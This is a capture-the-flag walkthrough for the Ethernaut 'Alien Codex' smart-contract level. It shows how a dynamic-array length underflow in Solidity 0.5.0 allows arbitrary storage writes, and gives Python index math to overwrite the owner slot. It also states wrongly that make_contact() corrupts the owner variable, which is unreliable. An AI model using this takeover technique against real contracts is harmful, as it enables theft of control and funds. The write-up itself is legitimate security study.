# 🛸 Ethernaut Level 19: Alien Codex (Solidity 0.5.0)

**Category:** Storage Manipulation  
**Tags:** Underhanded Solidity, Storage Collision, Arbitrary Write  
**Difficulty:** Hard  
**Goal:** Claim ownership of the contract using a storage manipulation exploit.

## 🧩 Challenge Overview

This contract inherits from OpenZeppelin's `Ownable` and has a dynamic array called `codex`. Our goal is to hijack the `owner` variable.

Key restrictions:
- Solidity version is **0.5.0**, meaning:
  - Dynamic arrays allow `.length--`
  - Storage packing and layout are less safe
- We don’t have access to newer tooling or OpenZeppelin upgrades
- The challenge forces us to understand **how Solidity lays out state variables in storage**

---

## 🔍 Step-by-Step Strategy

### 1. **Trigger the `contacted` modifier**

```solidity
function make_contact() public {
    contact = true;
}
```
Calling make_contact() flips a boolean and lets us interact with codex.

But here's the twist: both owner (inherited) and contact are stored in slot 0.

In Solidity 0.5.0:
- address owner takes 20 bytes
- bool contact takes 1 byte
- Solidity packs them together into slot 0

So:
- contact modifies the high-order byte
- owner sits in the lower 20 bytes of the same slot

Calling make_contact() sets contact = true, but corrupts owner. This breaks access control — and sets the stage for overwriting the entire slot.

---
### 2. Exploit underflow in the array length
In Solidity 0.5.0, .length-- is legal. If codex.length was 0, this sets it to: `codex.length = 2^256 - 1`  
Now we can write to any storage slot using codex[index] = value.

---
### 3. Understand how arrays are stored
In Solidity:
- Slot 1 holds codex.length
- The array data is stored at:
```
keccak256(1) → base_slot
```
Then:
```
codex[0] → slot = base_slot
codex[1] → slot = base_slot + 1
...
```
This layout allows us to reverse-engineer the index needed to overwrite slot 0.

## 🧠 Reverse Engineering the Index (to overwrite owner)
```text
Storage Slots Overview (simplified to 100 slots)

Slot     Content
─────    ──────────────────────────────
0        owner (20 bytes) + contact (1 byte)
1        codex.length
...
50       codex[0]
51       codex[1]
...

We want to overwrite slot 0 via codex[index]

So:
codex[index] → writes to slot: keccak256(1) + index

To target slot 0:
keccak256(1) + index ≡ 0 mod 2^256
⇒ index = 2^256 - keccak256(1)

🧮 Python:
base_slot = int.from_bytes(w3.keccak(b'\x01'.rjust(32, b'\x00')), 'big')
index = (2**256 - base_slot)

codex[index] = padded_attacker_address
→ directly overwrites slot 0 (i.e., owner)
```

| Concept                  | Insight                                                     |
| ------------------------ | ----------------------------------------------------------- |
| Solidity Storage Layout  | Variables may share slots — especially `bool` and `address` |
| Array Layout             | Data stored at `keccak256(slot)`                            |
| Underflow Exploit        | Dynamic arrays in 0.5.0 can underflow and enable OOB writes |
| Arbitrary Storage Writes | Index math lets you write to any slot, including `owner`    |
